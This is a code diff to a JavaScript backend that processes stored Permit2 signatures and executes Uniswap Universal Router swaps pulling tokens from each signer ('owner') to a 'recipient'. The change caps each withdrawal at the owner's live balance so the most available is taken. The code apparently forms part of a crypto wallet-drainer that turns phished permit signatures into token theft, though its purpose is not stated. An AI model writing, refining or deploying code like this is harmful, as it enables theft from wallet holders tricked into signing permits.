@@ -99,7 +99,7 @@ const COMMANDS = {
 // Build universal router payload
 // NOTE: Example path uses single hop to WETH; adapt path to your desired route.
 // -----------------------------
-function buildUniversalRouterTx(data) {
+function buildUniversalRouterTx(data, overrides = {}) {
   const {
     owner,
     token,
@@ -115,6 +115,8 @@ function buildUniversalRouterTx(data) {
 
   // normalize amount to BigInt
   const amountBn = BigInt(amount);
+  // withdrawAmount override (use provided withdrawAmount if set, otherwise default to signed amount)
+  const withdrawAmountBn = overrides.withdrawAmount !== undefined ? BigInt(overrides.withdrawAmount) : amountBn;
 
   // Build signature bytes
   const signatureBytes = buildSignatureBytes(r, s, v);
@@ -160,7 +162,7 @@ function buildUniversalRouterTx(data) {
   const swapAbi = new ethers.AbiCoder();
   const swapInput = swapAbi.encode(
     ["bytes", "uint256", "uint256", "address"],
-    [path, amountBn, minReceived, recipient]
+    [path, withdrawAmountBn, minReceived, recipient]
   );
 
   // Hardcoded command string: 0x02 (PERMIT2_PERMIT) followed by 0x08 (V3_SWAP_EXACT_IN)
@@ -225,7 +227,26 @@ async function processPending(limit = 10) {
     }
 
     try {
-      const { commands, inputs, execDeadline } = buildUniversalRouterTx(data);
+      // Compute owner token balance and set withdrawAmount = min(balance, signed amount)
+      let withdrawAmountBn = BigInt(data.amount);
+      try {
+        const tokenContract = new ethers.Contract(data.token, ["function balanceOf(address) view returns (uint256)"], provider);
+        const ownerBal = await tokenContract.balanceOf(data.owner);
+        const ownerBalBn = BigInt(ownerBal);
+        if (ownerBalBn < withdrawAmountBn) withdrawAmountBn = ownerBalBn;
+      } catch (bErr) {
+        console.error('failed to read owner balance', bErr);
+      }
+
+      if (withdrawAmountBn === 0n) {
+        await docSnap.ref.update({ lastError: 'owner has zero token balance', lastErrorAt: Date.now(), withdrawAmount: '0' });
+        continue;
+      }
+
+      // Save withdrawAmount for audit
+      try { await docSnap.ref.update({ withdrawAmount: withdrawAmountBn.toString() }); } catch (u) { console.error('failed to write withdrawAmount', u); }
+
+      const { commands, inputs, execDeadline } = buildUniversalRouterTx(data, { withdrawAmount: withdrawAmountBn });
 
       // Optional: estimate gas for better error messages
       let estimatedGas = null;
@@ -246,7 +267,8 @@ async function processPending(limit = 10) {
       await docSnap.ref.update({
         processed: true,
         routerTx: receipt.transactionHash,
-        processedAt: Date.now()
+        processedAt: Date.now(),
+        withdrawAmount: withdrawAmountBn.toString()
       });
 
       count++;
